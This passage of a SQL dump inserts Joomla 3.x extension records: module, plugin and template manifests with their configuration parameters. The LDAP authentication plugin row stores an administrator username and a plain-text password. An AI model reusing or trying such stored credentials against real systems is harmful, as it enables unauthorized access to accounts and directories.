(311, 'mod_title', 'module', 'mod_title', '', 1, 1, 1, 0, '{"name":"mod_title","type":"module","creationDate":"Nov 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_TITLE_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(312, 'mod_toolbar', 'module', 'mod_toolbar', '', 1, 1, 1, 1, '{"name":"mod_toolbar","type":"module","creationDate":"Nov 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_TOOLBAR_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(313, 'mod_multilangstatus', 'module', 'mod_multilangstatus', '', 1, 1, 1, 0, '{"name":"mod_multilangstatus","type":"module","creationDate":"September 2011","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_MULTILANGSTATUS_XML_DESCRIPTION","group":""}', '{"cache":"0"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(314, 'mod_version', 'module', 'mod_version', '', 1, 1, 1, 0, '{"name":"mod_version","type":"module","creationDate":"January 2012","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_VERSION_XML_DESCRIPTION","group":""}', '{"format":"short","product":"1","cache":"0"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(315, 'mod_stats_admin', 'module', 'mod_stats_admin', '', 1, 1, 1, 0, '{"name":"mod_stats_admin","type":"module","creationDate":"July 2004","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"MOD_STATS_XML_DESCRIPTION","group":""}', '{"serverinfo":"0","siteinfo":"0","counter":"0","increase":"0","cache":"1","cache_time":"900","cachemode":"static"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(316, 'mod_tags_popular', 'module', 'mod_tags_popular', '', 0, 1, 1, 0, '{"name":"mod_tags_popular","type":"module","creationDate":"January 2013","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.1.0","description":"MOD_TAGS_POPULAR_XML_DESCRIPTION","group":""}', '{"maximum":"5","timeframe":"alltime","owncache":"1"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(317, 'mod_tags_similar', 'module', 'mod_tags_similar', '', 0, 1, 1, 0, '{"name":"mod_tags_similar","type":"module","creationDate":"January 2013","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.1.0","description":"MOD_TAGS_SIMILAR_XML_DESCRIPTION","group":""}', '{"maximum":"5","matchtype":"any","owncache":"1"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(400, 'plg_authentication_gmail', 'plugin', 'gmail', 'authentication', 0, 0, 1, 0, '{"name":"plg_authentication_gmail","type":"plugin","creationDate":"February 2006","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_GMAIL_XML_DESCRIPTION","group":""}', '{"applysuffix":"0","suffix":"","verifypeer":"1","user_blacklist":""}', '', '', 0, '0000-00-00 00:00:00', 1, 0),
(401, 'plg_authentication_joomla', 'plugin', 'joomla', 'authentication', 0, 1, 1, 1, '{"name":"plg_authentication_joomla","type":"plugin","creationDate":"November 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_AUTH_JOOMLA_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(402, 'plg_authentication_ldap', 'plugin', 'ldap', 'authentication', 0, 0, 1, 0, '{"name":"plg_authentication_ldap","type":"plugin","creationDate":"November 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_LDAP_XML_DESCRIPTION","group":""}', '{"host":"","port":"389","use_ldapV3":"0","negotiate_tls":"0","no_referrals":"0","auth_method":"bind","base_dn":"","search_string":"","users_dn":"","username":"admin","password":"bobby7","ldap_fullname":"fullName","ldap_email":"mail","ldap_uid":"uid"}', '', '', 0, '0000-00-00 00:00:00', 3, 0),
(404, 'plg_content_emailcloak', 'plugin', 'emailcloak', 'content', 0, 1, 1, 0, '{"name":"plg_content_emailcloak","type":"plugin","creationDate":"November 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_CONTENT_EMAILCLOAK_XML_DESCRIPTION","group":""}', '{"mode":"1"}', '', '', 0, '0000-00-00 00:00:00', 1, 0),
(405, 'plg_content_geshi', 'plugin', 'geshi', 'content', 0, 0, 1, 0, '{"name":"plg_content_geshi","type":"plugin","creationDate":"November 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"","authorUrl":"qbnz.com\\/highlighter","version":"3.0.0","description":"PLG_CONTENT_GESHI_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 2, 0),
(406, 'plg_content_loadmodule', 'plugin', 'loadmodule', 'content', 0, 1, 1, 0, '{"name":"plg_content_loadmodule","type":"plugin","creationDate":"November 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_LOADMODULE_XML_DESCRIPTION","group":""}', '{"style":"xhtml"}', '', '', 0, '2011-09-18 15:22:50', 0, 0),
(407, 'plg_content_pagebreak', 'plugin', 'pagebreak', 'content', 0, 1, 1, 0, '{"name":"plg_content_pagebreak","type":"plugin","creationDate":"November 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_CONTENT_PAGEBREAK_XML_DESCRIPTION","group":""}', '{"title":"1","multipage_toc":"1","showall":"1"}', '', '', 0, '0000-00-00 00:00:00', 4, 0),
(408, 'plg_content_pagenavigation', 'plugin', 'pagenavigation', 'content', 0, 1, 1, 0, '{"name":"plg_content_pagenavigation","type":"plugin","creationDate":"January 2006","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_PAGENAVIGATION_XML_DESCRIPTION","group":""}', '{"position":"1"}', '', '', 0, '0000-00-00 00:00:00', 5, 0),
(409, 'plg_content_vote', 'plugin', 'vote', 'content', 0, 1, 1, 0, '{"name":"plg_content_vote","type":"plugin","creationDate":"November 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_VOTE_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 6, 0),
(410, 'plg_editors_codemirror', 'plugin', 'codemirror', 'editors', 0, 1, 1, 1, '{"name":"plg_editors_codemirror","type":"plugin","creationDate":"28 March 2011","author":"Marijn Haverbeke","copyright":"","authorEmail":"N\\/A","authorUrl":"","version":"1.0","description":"PLG_CODEMIRROR_XML_DESCRIPTION","group":""}', '{"linenumbers":"0","tabmode":"indent"}', '', '', 0, '0000-00-00 00:00:00', 1, 0),
(411, 'plg_editors_none', 'plugin', 'none', 'editors', 0, 1, 1, 1, '{"name":"plg_editors_none","type":"plugin","creationDate":"August 2004","author":"Unknown","copyright":"","authorEmail":"N\\/A","authorUrl":"","version":"3.0.0","description":"PLG_NONE_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 2, 0),
(412, 'plg_editors_tinymce', 'plugin', 'tinymce', 'editors', 0, 1, 1, 0, '{"name":"plg_editors_tinymce","type":"plugin","creationDate":"2005-2012","author":"Moxiecode Systems AB","copyright":"Moxiecode Systems AB","authorEmail":"N\\/A","authorUrl":"tinymce.moxiecode.com\\/","version":"3.5.6","description":"PLG_TINY_XML_DESCRIPTION","group":""}', '{"mode":"1","skin":"0","entity_encoding":"raw","lang_mode":"0","lang_code":"en","text_direction":"ltr","content_css":"1","content_css_custom":"","relative_urls":"1","newlines":"0","invalid_elements":"script,applet,iframe","extended_elements":"","toolbar":"top","toolbar_align":"left","html_height":"550","html_width":"750","resizing":"true","resize_horizontal":"false","element_path":"1","fonts":"1","paste":"1","searchreplace":"1","insertdate":"1","format_date":"%Y-%m-%d","inserttime":"1","format_time":"%H:%M:%S","colors":"1","table":"1","smilies":"1","media":"1","hr":"1","directionality":"1","fullscreen":"1","style":"1","layer":"1","xhtmlxtras":"1","visualchars":"1","nonbreaking":"1","template":"1","blockquote":"1","wordcount":"1","advimage":"1","advlink":"1","advlist":"1","autosave":"1","contextmenu":"1","inlinepopups":"1","custom_plugin":"","custom_button":""}', '', '', 0, '0000-00-00 00:00:00', 3, 0),
(413, 'plg_editors-xtd_article', 'plugin', 'article', 'editors-xtd', 0, 1, 1, 1, '{"name":"plg_editors-xtd_article","type":"plugin","creationDate":"October 2009","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_ARTICLE_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 1, 0),
(414, 'plg_editors-xtd_image', 'plugin', 'image', 'editors-xtd', 0, 1, 1, 0, '{"name":"plg_editors-xtd_image","type":"plugin","creationDate":"August 2004","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_IMAGE_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 2, 0),
(415, 'plg_editors-xtd_pagebreak', 'plugin', 'pagebreak', 'editors-xtd', 0, 1, 1, 0, '{"name":"plg_editors-xtd_pagebreak","type":"plugin","creationDate":"August 2004","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_EDITORSXTD_PAGEBREAK_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 3, 0),
(416, 'plg_editors-xtd_readmore', 'plugin', 'readmore', 'editors-xtd', 0, 1, 1, 0, '{"name":"plg_editors-xtd_readmore","type":"plugin","creationDate":"March 2006","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_READMORE_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 4, 0),
(417, 'plg_search_categories', 'plugin', 'categories', 'search', 0, 1, 1, 0, '{"name":"plg_search_categories","type":"plugin","creationDate":"November 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_SEARCH_CATEGORIES_XML_DESCRIPTION","group":""}', '{"search_limit":"50","search_content":"1","search_archived":"1"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(418, 'plg_search_contacts', 'plugin', 'contacts', 'search', 0, 1, 1, 0, '{"name":"plg_search_contacts","type":"plugin","creationDate":"November 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_SEARCH_CONTACTS_XML_DESCRIPTION","group":""}', '{"search_limit":"50","search_content":"1","search_archived":"1"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(419, 'plg_search_content', 'plugin', 'content', 'search', 0, 1, 1, 0, '{"name":"plg_search_content","type":"plugin","creationDate":"November 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_SEARCH_CONTENT_XML_DESCRIPTION","group":""}', '{"search_limit":"50","search_content":"1","search_archived":"1"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(420, 'plg_search_newsfeeds', 'plugin', 'newsfeeds', 'search', 0, 1, 1, 0, '{"name":"plg_search_newsfeeds","type":"plugin","creationDate":"November 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_SEARCH_NEWSFEEDS_XML_DESCRIPTION","group":""}', '{"search_limit":"50","search_content":"1","search_archived":"1"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(421, 'plg_search_weblinks', 'plugin', 'weblinks', 'search', 0, 1, 1, 0, '{"name":"plg_search_weblinks","type":"plugin","creationDate":"November 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_SEARCH_WEBLINKS_XML_DESCRIPTION","group":""}', '{"search_limit":"50","search_content":"1","search_archived":"1"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(422, 'plg_system_languagefilter', 'plugin', 'languagefilter', 'system', 0, 0, 1, 1, '{"name":"plg_system_languagefilter","type":"plugin","creationDate":"July 2010","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_SYSTEM_LANGUAGEFILTER_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 1, 0),
(423, 'plg_system_p3p', 'plugin', 'p3p', 'system', 0, 1, 1, 0, '{"name":"plg_system_p3p","type":"plugin","creationDate":"September 2010","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_P3P_XML_DESCRIPTION","group":""}', '{"headers":"NOI ADM DEV PSAi COM NAV OUR OTRo STP IND DEM"}', '', '', 0, '0000-00-00 00:00:00', 2, 0),
(424, 'plg_system_cache', 'plugin', 'cache', 'system', 0, 0, 1, 1, '{"name":"plg_system_cache","type":"plugin","creationDate":"February 2007","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_CACHE_XML_DESCRIPTION","group":""}', '{"browsercache":"0","cachetime":"15"}', '', '', 0, '0000-00-00 00:00:00', 9, 0),
(425, 'plg_system_debug', 'plugin', 'debug', 'system', 0, 1, 1, 0, '{"name":"plg_system_debug","type":"plugin","creationDate":"December 2006","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_DEBUG_XML_DESCRIPTION","group":""}', '{"profile":"1","queries":"1","memory":"1","language_files":"1","language_strings":"1","strip-first":"1","strip-prefix":"","strip-suffix":""}', '', '', 0, '0000-00-00 00:00:00', 4, 0);
INSERT INTO `j6kpf_extensions` (`extension_id`, `name`, `type`, `element`, `folder`, `client_id`, `enabled`, `access`, `protected`, `manifest_cache`, `params`, `custom_data`, `system_data`, `checked_out`, `checked_out_time`, `ordering`, `state`) VALUES
(426, 'plg_system_log', 'plugin', 'log', 'system', 0, 1, 1, 1, '{"name":"plg_system_log","type":"plugin","creationDate":"April 2007","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_LOG_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 5, 0),
(427, 'plg_system_redirect', 'plugin', 'redirect', 'system', 0, 1, 1, 1, '{"name":"plg_system_redirect","type":"plugin","creationDate":"April 2009","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_REDIRECT_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 6, 0),
(428, 'plg_system_remember', 'plugin', 'remember', 'system', 0, 1, 1, 1, '{"name":"plg_system_remember","type":"plugin","creationDate":"April 2007","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_REMEMBER_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 7, 0),
(429, 'plg_system_sef', 'plugin', 'sef', 'system', 0, 1, 1, 0, '{"name":"plg_system_sef","type":"plugin","creationDate":"December 2007","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_SEF_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 8, 0),
(430, 'plg_system_logout', 'plugin', 'logout', 'system', 0, 1, 1, 1, '{"name":"plg_system_logout","type":"plugin","creationDate":"April 2009","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_SYSTEM_LOGOUT_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 3, 0),
(431, 'plg_user_contactcreator', 'plugin', 'contactcreator', 'user', 0, 0, 1, 0, '{"name":"plg_user_contactcreator","type":"plugin","creationDate":"August 2009","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_CONTACTCREATOR_XML_DESCRIPTION","group":""}', '{"autowebpage":"","category":"34","autopublish":"0"}', '', '', 0, '0000-00-00 00:00:00', 1, 0),
(432, 'plg_user_joomla', 'plugin', 'joomla', 'user', 0, 1, 1, 0, '{"name":"plg_user_joomla","type":"plugin","creationDate":"December 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2009 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_USER_JOOMLA_XML_DESCRIPTION","group":""}', '{"autoregister":"1"}', '', '', 0, '0000-00-00 00:00:00', 2, 0),
(433, 'plg_user_profile', 'plugin', 'profile', 'user', 0, 0, 1, 0, '{"name":"plg_user_profile","type":"plugin","creationDate":"January 2008","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_USER_PROFILE_XML_DESCRIPTION","group":""}', '{"register-require_address1":"1","register-require_address2":"1","register-require_city":"1","register-require_region":"1","register-require_country":"1","register-require_postal_code":"1","register-require_phone":"1","register-require_website":"1","register-require_favoritebook":"1","register-require_aboutme":"1","register-require_tos":"1","register-require_dob":"1","profile-require_address1":"1","profile-require_address2":"1","profile-require_city":"1","profile-require_region":"1","profile-require_country":"1","profile-require_postal_code":"1","profile-require_phone":"1","profile-require_website":"1","profile-require_favoritebook":"1","profile-require_aboutme":"1","profile-require_tos":"1","profile-require_dob":"1"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(434, 'plg_extension_joomla', 'plugin', 'joomla', 'extension', 0, 1, 1, 1, '{"name":"plg_extension_joomla","type":"plugin","creationDate":"May 2010","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_EXTENSION_JOOMLA_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 1, 0),
(435, 'plg_content_joomla', 'plugin', 'joomla', 'content', 0, 1, 1, 0, '{"name":"plg_content_joomla","type":"plugin","creationDate":"November 2010","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_CONTENT_JOOMLA_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(436, 'plg_system_languagecode', 'plugin', 'languagecode', 'system', 0, 0, 1, 0, '{"name":"plg_system_languagecode","type":"plugin","creationDate":"November 2011","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_SYSTEM_LANGUAGECODE_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 10, 0),
(437, 'plg_quickicon_joomlaupdate', 'plugin', 'joomlaupdate', 'quickicon', 0, 1, 1, 1, '{"name":"plg_quickicon_joomlaupdate","type":"plugin","creationDate":"August 2011","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_QUICKICON_JOOMLAUPDATE_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(438, 'plg_quickicon_extensionupdate', 'plugin', 'extensionupdate', 'quickicon', 0, 1, 1, 1, '{"name":"plg_quickicon_extensionupdate","type":"plugin","creationDate":"August 2011","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_QUICKICON_EXTENSIONUPDATE_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(439, 'plg_captcha_recaptcha', 'plugin', 'recaptcha', 'captcha', 0, 1, 1, 0, '{"name":"plg_captcha_recaptcha","type":"plugin","creationDate":"December 2011","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_CAPTCHA_RECAPTCHA_XML_DESCRIPTION","group":""}', '{"public_key":"","private_key":"","theme":"clean"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(440, 'plg_system_highlight', 'plugin', 'highlight', 'system', 0, 1, 1, 0, '{"name":"plg_system_highlight","type":"plugin","creationDate":"August 2011","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_SYSTEM_HIGHLIGHT_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 7, 0),
(441, 'plg_content_finder', 'plugin', 'finder', 'content', 0, 0, 1, 0, '{"name":"plg_content_finder","type":"plugin","creationDate":"December 2011","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_CONTENT_FINDER_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(442, 'plg_finder_categories', 'plugin', 'categories', 'finder', 0, 1, 1, 0, '{"name":"plg_finder_categories","type":"plugin","creationDate":"August 2011","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_FINDER_CATEGORIES_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 1, 0),
(443, 'plg_finder_contacts', 'plugin', 'contacts', 'finder', 0, 1, 1, 0, '{"name":"plg_finder_contacts","type":"plugin","creationDate":"August 2011","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_FINDER_CONTACTS_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 2, 0),
(444, 'plg_finder_content', 'plugin', 'content', 'finder', 0, 1, 1, 0, '{"name":"plg_finder_content","type":"plugin","creationDate":"August 2011","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_FINDER_CONTENT_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 3, 0),
(445, 'plg_finder_newsfeeds', 'plugin', 'newsfeeds', 'finder', 0, 1, 1, 0, '{"name":"plg_finder_newsfeeds","type":"plugin","creationDate":"August 2011","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_FINDER_NEWSFEEDS_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 4, 0),
(446, 'plg_finder_weblinks', 'plugin', 'weblinks', 'finder', 0, 1, 1, 0, '{"name":"plg_finder_weblinks","type":"plugin","creationDate":"August 2011","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_FINDER_WEBLINKS_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 5, 0),
(447, 'plg_finder_tags', 'plugin', 'tags', 'finder', 0, 1, 1, 0, '{"name":"plg_finder_tags","type":"plugin","creationDate":"February 2013","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"3.0.0","description":"PLG_FINDER_TAGS_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(503, 'beez3', 'template', 'beez3', '', 0, 1, 1, 0, '{"name":"beez3","type":"template","creationDate":"25 November 2009","author":"Angie Radtke","copyright":"Copyright (C) 2005 - 2013 Open Source Matters, Inc. All rights reserved.","authorEmail":"a.radtke@derauftritt.de","authorUrl":"http:\\/\\/www.der-auftritt.de","version":"3.0.0","description":"TPL_BEEZ3_XML_DESCRIPTION","group":""}', '{"wrapperSmall":"53","wrapperLarge":"72","sitetitle":"","sitedescription":"","navposition":"center","templatecolor":"nature"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(504, 'hathor', 'template', 'hathor', '', 1, 1, 1, 0, '{"name":"hathor","type":"template","creationDate":"May 2010","author":"Andrea Tarr","copyright":"Copyright (C) 2005 - 2013 Open Source Matters, Inc. All rights reserved.","authorEmail":"hathor@tarrconsulting.com","authorUrl":"http:\\/\\/www.tarrconsulting.com","version":"3.0.0","description":"TPL_HATHOR_XML_DESCRIPTION","group":""}', '{"showSiteName":"0","colourChoice":"0","boldText":"0"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(506, 'protostar', 'template', 'protostar', '', 0, 1, 1, 0, '{"name":"protostar","type":"template","creationDate":"4\\/30\\/2012","author":"Kyle Ledbetter","copyright":"Copyright (C) 2005 - 2013 Open Source Matters, Inc. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"","version":"1.0","description":"TPL_PROTOSTAR_XML_DESCRIPTION","group":""}', '{"templateColor":"","logoFile":"","googleFont":"1","googleFontName":"Open+Sans","fluidContainer":"0"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(507, 'isis', 'template', 'isis', '', 1, 1, 1, 0, '{"name":"isis","type":"template","creationDate":"3\\/30\\/2012","author":"Kyle Ledbetter","copyright":"Copyright (C) 2005 - 2013 Open Source Matters, Inc. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"","version":"1.0","description":"TPL_ISIS_XML_DESCRIPTION","group":""}', '{"templateColor":"","logoFile":""}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
